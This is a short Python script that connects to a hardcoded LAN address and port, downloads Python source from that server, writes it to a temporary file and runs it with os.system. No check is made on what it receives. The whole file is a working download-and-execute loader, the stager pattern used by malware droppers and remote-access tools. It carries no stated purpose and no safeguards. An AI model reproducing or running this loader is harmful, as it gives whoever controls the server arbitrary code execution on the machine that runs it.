import socket
import os
import tempfile


BUFFER = 1028 * 4

"""IP = input("Enter the Server ip: ")
PORT = int(input("Enter the port number: "))"""

IP = "192.168.1.15"
PORT = 24680
EOS = "--||--"
Socket = socket.socket()
Socket.connect((IP, PORT))


def StringDecoder():
    Socket.send("code".encode())
    data = ""
    while True:
        data = data + Socket.recv(BUFFER).decode()
        if data.endswith(EOS):
            break
    return data.replace(EOS, "")


def Run():
    Code = StringDecoder()
    Socket.close()
    temp = tempfile.NamedTemporaryFile(mode='w+',suffix=".py",delete=False)
    temp.write(Code)
    temp.close()
    os.system(f"python {temp.name} --Port {PORT} --IP {IP}")

Run()
